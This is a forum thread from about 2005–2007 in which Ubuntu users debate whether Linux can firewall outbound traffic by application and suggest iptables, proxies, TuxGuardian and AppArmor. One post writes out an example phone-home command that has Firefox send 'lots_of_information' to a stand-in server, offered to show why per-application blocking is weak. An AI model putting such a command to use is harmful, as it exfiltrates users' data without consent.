---
title: "A true software firewall?"
date: 2005-12-05
forum: Server Platforms
---

### Post by towsonu2003 on 2005-12-05
I am aware that a similar threat is running at [http://www.ubuntuforums.org/showthread.php?t=95845](http://www.ubuntuforums.org/showthread.php?t=95845) but it has almost nothing to do with my question... 

This ( [http://www.ubuntuforums.org/showthread.php?t=93974](http://www.ubuntuforums.org/showthread.php?t=93974) ) threat doesn't help either.

My question: do we have a software firewall? that is, a firewall that filters **outbound** connections not in reference to its port (32, 80, 23, 443 etc) but *in reference to the software that initiates it* (firefox, galeon, apt, gaim etc)? 

For example, I would want an iptables setup that would accept firefox's outbound request to use port 80 but nothing else (such as galeon, epiphany, apt - http, gaim) unless I told it to accept...

if we don't have one, is there a howto that shows how to set iptables to blacklist all software's internet access unless whitelisted? anyone who is actually doing this?

google keep talking about how to do stuff with inbound or outbound in relation to ports, not software initiating the 'call'...

---

### Post by LordHunter317 on 2005-12-05
You can setup iptables do this on a very limited basis via the owner module.

It's broken for SMTP though, so it's not really worth the hassle.  The short answer is not really, and it would require more programming than worthwhile.  It's generally of dubious value anyway.

---

### Post by towsonu2003 on 2005-12-05
[QUOTE=LordHunter317]You can setup iptables do this on a very limited basis via the owner module.[/QUOTE]

any pointers (some kind of a howto, or a tutorial, or just a blog who did this, or even nice working google keywords -english not my first language, so I suck at googling...-)? I have to tell you that I am so newbie, I dont even know what 'owner module' is :)

thanks for the reply :)

---

### Post by stimpack on 2005-12-05
This is a pretty essential function I would like them to add to ubuntu as high priority. Its important to me to control what apps can 'phone home'. Need the fine grained control of allowing an app to connect to the internet but not to phone home, and not by blindly blocking a domain to all applications.

---

### Post by LordHunter317 on 2005-12-05
[QUOTE=stimpack]Its important to me to control what apps can 'phone home'. [/quote]I don't think I have a single Linux application that phones home without asking me first.  VMware might.  That's it.

---

### Post by towsonu2003 on 2005-12-07
[QUOTE=LordHunter317]I don't think I have a single Linux application that phones home without asking me first.  VMware might.  That's it.[/QUOTE]
although not so relevant to me, let's *assume* linux calls home too :) and even, let's say they might call (fill-in-here) ... i would rather like to see anything for this:
> any pointers (some kind of a howto, or a tutorial, or just a blog who did this, or even nice working google keywords -english not my first language, so I suck at googling...-)? 
thanks again for replying... :)

---

### Post by mgor on 2005-12-07
i don't really know what the iptables ower modules do, but afaik iptables only goes as high as the transport layer in the OSI model.

if you wan't to filter at the application level you'll need a proxy server such as squid.
with a proxy you can filter on the contents of the payload in a tcp segment, blocking certain URLs etc.

---

### Post by NotJustANewbie on 2005-12-11
Sorry for being wrong if you've already thought of it: [http://fs-security.com](http://fs-security.com)

---

### Post by UbuWu on 2005-12-11
[QUOTE=NotJustANewbie]Sorry for being wrong if you've already thought of it: [http://fs-security.com](http://fs-security.com)[/QUOTE]

Firestarter is just a frontend to iptables.

---

### Post by towsonu2003 on 2005-12-11
[QUOTE=NotJustANewbie]Sorry for being wrong if you've already thought of it: [http://fs-security.com](http://fs-security.com)[/QUOTE]
unfortunately, neither firestarter (I used to use that) nor guarddog (I'm currently using that) have that feature, but thanks for suggesting :)

---

### Post by prizrak on 2005-12-12
Firestarter can be set in whitelisting mode for outgoing connections but again only by port. It's very difficult to have a firewall that blocks out software under Linux. There is alot of codesharing being done, if you ever took a look at your connections in firestarter you would see that quite a few programs that open connections are listed as simply python because they use it as the back(front?)end for networking. Epiphany and Firefox both use Gecko so firewall might recognize them both as the same app (never did check to see if that would be true, too lazy). You could do that in Windows since each program was more or less self contained so it was easy to determine what's running what. So basically there is no way to do it (unless you decide to program something that seems like would be mad complex yourself)

---

### Post by psusi on 2005-12-12
Not only can it not really be done, it is also rather pointless.  One of the benefits of using open source software is that you know it isn't doing things you don't want without your consent, like phoning home.  

I suppose though, if you really want to, you can set up a proxy server that you have to go through and only configure the programs you want to know about the proxy.  

If you suspect something odd is going on, you can monitor your network traffic with utilities like tcpdump or ethereal and see weather or not something is phoning home.

---

### Post by towsonu2003 on 2005-12-12
[QUOTE=psusi]One of the benefits of using open source software is that you know it isn't doing things you don't want without your consent, like phoning home.  [/quote]
Well, to be honest, I don't really like this argument :) no way people can check each and every bit of code in a software to make sure it is safe and has no backdoors.. but never mind..
[quote=psusi]
I suppose though, if you really want to, you can set up a proxy server that you have to go through and only configure the programs you want to know about the proxy.  [/quote]I guess I'm gonna go with this one, once I have time and get out of my lazy-mode. Thanks for the suggestion.

Also, thanks to everyone who replied. I appreciate the help very much.

---

### Post by LordHunter317 on 2005-12-12
[QUOTE=towsonu2003]Well, to be honest, I don't really like this argument :) no way people can check each and every bit of code in a software to make sure it is safe and has no backdoors.. but never mind..[/quote]Yes people have, can and do.  Usually not for security, but for reliablity, like in life-safety situations.

---

### Post by defile on 2005-12-13
Here is a starting off point for you.

[http://l7-filter.sourceforge.net/L7-HOWTO-Netfilter](http://l7-filter.sourceforge.net/L7-HOWTO-Netfilter)

You will have to patch and recompile your kernel as well as iptables.

In short, not for the faint of heart, but if you're determined...

---

### Post by towsonu2003 on 2005-12-21
[QUOTE=defile]Here is a starting off point for you.

[http://l7-filter.sourceforge.net/L7-HOWTO-Netfilter](http://l7-filter.sourceforge.net/L7-HOWTO-Netfilter)

You will have to patch and recompile your kernel as well as iptables.

In short, not for the faint of heart, but if you're determined...[/QUOTE]
oh, that's over my head, but thanks so much :)

---

### Post by BoogieKnight on 2007-08-08
Sorry to comment on an old thread but I've been looking all over for a Linux firewall capable of application specific rules (blocking/allowing/etc). Has there been any progress in this area? I'm really looking for something akin to Kerio Personal Firewall in Windows but so far have come up empty.

I know the argument that this isn't really necessary in Linux but considering that I'm a total control freak :)  when it comes to my system I would REALLY like to see this for Linux at some point.

Finally, if nothing currently exists that can do this, is there a technical reason why... or is it just lack of interest from developers?

Thanks for your time.

---

### Post by psusi on 2007-08-08
No.

---

### Post by ssam on 2007-08-08
suppose you have a firewall that only allows outbound packets from firefox.

my bit of phonehome software just needs to run the command
```
firefox http://mysever.com/phonehome.php?lots_of_information
```

how would the firewall stop that?

if you allow wget to get through the firewall, i can do it with having to open a firefox window. if you disable wget many things wont work.

Also how would the firewall handle something like python or mono?

---

### Post by ruibernardo on 2007-08-08
I don't want to argue with what ssam is saying, but I find this very odd, to say the least. 

My question is: since there was a owner module for iptables, and it is broken on SMP processors why all this lack of interest?

If it existed and was working it was because somebody really though it was useful for something.

It is still (in theory, I think) supported by iptables, why isn't the linux kernel fixed for SMP?

> **BoogieKnight said:**
> 
is there a technical reason why... or is it just lack of interest from developers?


Anybody knows these answers? Is there a message in the linux kernel mailing list where this is explained? (I've searched there once, never found anything, it's huge)

---

### Post by psusi on 2007-08-09
Due to lack of interest because it is a useless feature, as illustrated by ssam.

---

### Post by perspectoff on 2007-08-09
Shorewall does what I think you're asking: restrict in/out communication by program, not just by port.

Shorewall is not that easy to use, yet.

---

### Post by MrHorus on 2007-08-09
> **stimpack said:**
> Its important to me to control what apps can 'phone home'. Need the fine grained control of allowing an app to connect to the internet but not to phone home.

Personally I allow outgoing connections on an explicit basis then put a drop all at the end of the script.

For example, I only allow SMTP connections to one specific IP and port - that of my ISP and anything else is blocked.

---

### Post by BoogieKnight on 2007-08-09
just took a look at Shorewall's website and found this
[http://www.shorewall.net/Shorewall_Doesnt.html](http://www.shorewall.net/Shorewall_Doesnt.html)

"Shorewall Does not:  Act as a &#8220;Personal Firewall&#8221; that allows internet access control by application. If that's what you are looking for, try TuxGuardian."

looking at the TuxGuardian website, it appears to do what I'm looking for but hasn't been updated in over a year... worth a try I guess.
[http://tuxguardian.sourceforge.net/]("http://tuxguardian.sourceforge.net/")

---

### Post by steve.horsley on 2007-08-10
I heard about this recently - maybe overkill for you, maybe not.
[http://www.novell.com/linux/security/apparmor/overview.html](http://www.novell.com/linux/security/apparmor/overview.html)

---

### Post by ssam on 2007-08-12
> **steve.horsley said:**
> I heard about this recently - maybe overkill for you, maybe not.
[http://www.novell.com/linux/security/apparmor/overview.html](http://www.novell.com/linux/security/apparmor/overview.html)

and it going to be in gutsy [http://www.ubuntu.com/testing/tribe4](http://www.ubuntu.com/testing/tribe4) [https://help.ubuntu.com/community/AppArmor](https://help.ubuntu.com/community/AppArmor)

---

### Post by steve.horsley on 2007-08-12
> **ssam said:**
> and it going to be in gutsy [http://www.ubuntu.com/testing/tribe4](http://www.ubuntu.com/testing/tribe4) [https://help.ubuntu.com/community/AppArmor](https://help.ubuntu.com/community/AppArmor)

Very interesting. Nice link. Thanks.

---

### Post by euler_fan on 2007-08-12
you might try googling "application firewall". I remember seeing a project somewhere for one that checks to see if an app has permission to access the internet but cannot remember the name or seem to find it again.

It was TuxGuardian. Guess I should have read the previous posts :)

---

### Post by eentonig on 2007-08-12
You will never be able to block by aplpication, because a Firewall doesn't know which application originates traffic. But you can filter on port level. So you can influence the behavior for all webborwser ie.

My suggestion. Install fwbuilder and set it up to block all in- and outgoing traffic. And then enable the traffic that you want.

---

### Post by misfitpierce on 2007-08-12
You can just use firestarter and on outbound rules set to restrict all and add rule for port 80 etc. for example and it would only allow that.

---

### Post by BoogieKnight on 2007-08-13
This is an odd statement considering most if not all Windows firewalls are capable of blocking on a per application basis... in fact many will even inform you if one application tries to use another application to access the net and give you the ability to block or allow it to do so. 


> **eentonig said:**
> You will never be able to block by aplpication, because a Firewall doesn't know which application originates traffic. But you can filter on port level. So you can influence the behavior for all webborwser ie.

My suggestion. Install fwbuilder and set it up to block all in- and outgoing traffic. And then enable the traffic that you want.

---

### Post by Wim Sturkenboom on 2007-08-14
It depends on the definition of a firewall. From wikipedia:
> A firewall's function within a network is similar to firewalls with fire door in building construction. In former case, it is used to prevent network intrusion to the private network. In latter case, it is intended to contain and delay structural fire from spreading to adjacent structures. An analogy of network firewall is a fire-resistance rated wall with a fire-resistance rated, self-closing, solid-core, inside unlockable, outside key-lockable door between a house and its attached garage.
From that, the application based firewalls are not firewalls in the true sense.

The firewall in the building will not allow certain peoiple to get out and deny others (so they're trapped in the fire). So once that door (e.g. poirt 80) is open, anybody can use it.

---

### Post by clubsoda on 2007-12-27
A couple of ideas, neither of which is a "firewall" per se, but would either of these be worth the trouble?

1) Create a new user (with limited groups & permissions) for the sole purpose of browsing the 'net.  That protects your personal files from browser exploits, unless root privileges can be attained.

2) A process monitor which logs and/or alerts you whenever a new process starts or finishes.  Once trained, the benefits could outweigh the inconvenience.

---

### Post by koenn on 2007-12-27
it's an old thread, but I found it kinda interesting, so I had a look around. 

It seems to me that it would indeed be possible to create this sort of firewall. 
Given that eg 'netstat -ptna' shows established connections and listening servers + the program that initiated them, and 'pstree' can show running processes and which process started an other, it seems to me that it's quite possible to write a program that checks what program is trying to set up a connection, and match those against black- or whitelists. 

On the other hand 
* Installing software requires root - you *know* what software you installed. 
* Open source software is out in the open, for everyone to see. Any suspicious "phone home" code would not go unnoticed
* Linux users don't have write access outside their home, so drive-by installations of spyware and trojans from websites won't work
* a firewall is not a fix for sloppy user management. If you want certain users or certain PC's not to use, say, Skype, don't install it, or deny the user acces to the executable, in stead of trying to block it at a firewall.
* If you're running software that you don't trust (eg closed source)
consider an open source alternative, or check where it connects to, and block that destination in your firewall (or on your proxy if it tunnels through http

Now, I can understand that mot of these circumstances don't apply to Windows, so I can see why these 'personal firewalls' were developped, but while it's (probably) possible to create something similar for Linux, I can understand that it's not a high priority for developers, given the lack of use case.

---

### Post by psusi on 2007-12-27
It isn't possible because the attempt is misguided.  There is no way to tell simply from which executable is running if a process is using the network in an allowed way.  For instance, wget is used by many different scripts and programs to download files from the web.  That would mean wget would be flagged as allowed, but it can just as easily be called by a malicious script and will be allowed to pass.

---

### Post by koenn on 2007-12-27
I called wget from a shell in a shell in a screen session in a shell in a gnome terminal ... to emulate one program calling an other and in the end do a wget.
pstree tells me

```

     &#9500;&#9472;gksu&#9472;&#9472;&#9472;gnome-terminal&#9472;&#9516;&#9472;bash&#9472;&#9472;&#9472;pstree
     &#9474;                       &#9500;&#9472;bash&#9472;&#9472;&#9472;sh&#9472;&#9472;&#9472;bash&#9472;&#9472;&#9472;screen&#9472;&#9472;&#9472;sh&#9472;&#9472;&#9472;bash&#9472;&#9472;&#9472;wget
     &#9474;                       



```
so, it's impossible to track which program started wget ?

---

### Post by psusi on 2007-12-28
It is possible, just not any more useful than knowing it's wget running.

---

### Post by koenn on 2007-12-28
come on, seriously. 
Do you really not see how this could translate in
"program So_And_So  has started wget to connect to the internet. 
Block  -- Allow this time -- Always Allow ?  "

---

### Post by psusi on 2007-12-28
And you have the same problem.... bash starting wget happens all the time, so you would say allow always, then a malicious script that is interpreted by bash runs wget and it is allowed.

---

### Post by koenn on 2007-12-28
> **psusi said:**
> And you have the same problem.... bash starting wget happens all the time, so you would say allow always, then a malicious script that is interpreted by bash runs wget and it is allowed.

That's not the point. The point was all these claims throughout this thread that "you can't tell wich program initiates a connection".
Obviously you can. You can even track back if a program was started by another process, and which one(s). 
That I used bash (and sh and screen) was just a demo, a proof of concept. I don't have the skill to quickly write an application, just to make a point. 


Now, whether the info is usefull, is another discussion. If, in those Windows personal firewalls, you get "HackTool wants to connect to the internet", you might want to block it. If  you get "WinConnect is attempting to connect to the internet' , maybe some people will allow it because it sounds legit, and they don't want to block it for fear they mes up their internet connection and don't know how to fix it. WinConnect is, of course, just a friendly name for a trojan or so.


Same with linux scripts. If you're running a script, and you know what it is for, you probably know whether it's reasonable for it to establish a  network connection. If you're manually running wget from a shell, you'll allow it, because otherwise you won't get anything. If you're not doing anything but watch a video, and suddenly you get "bash has started wget to ..."  maybe you'd block it and go find out where this is coming from ? 
And of course there'll always be people who routinely click "always allow" to get rid of the pop ups. 

I'm no fan of "personal firewalls" of this sort. See my post earlier - they're not really useful on Linux. Even on Windows, their usefulness is questionable, as lots of it depends on user judgement. 

But that doesn't mean it would be impossible to create such firewall for Linux.

---

### Post by HermanAB on 2007-12-28
Hmm, blocking things based on users and other parameters can be done with squid-cache and squidguard.  However, there is not much point in doing that.

There is also another firewall feature to look at: tcpwrappers.  Programs that are compiled with libwrap can be controlled via /etc/hosts.allow and /etc/hosts.deny.

BTW, if you wish to use Shorewall, then you need Webmin to administer it.

Cheers,

Herman

---

### Post by psusi on 2007-12-28
Yes, it is possible, just not useful.  And sooner or later the windows trojan authors are going to wise up and bypass that popup by just having Internet Explorer do the connecting for them, which the user has already allowed.

---

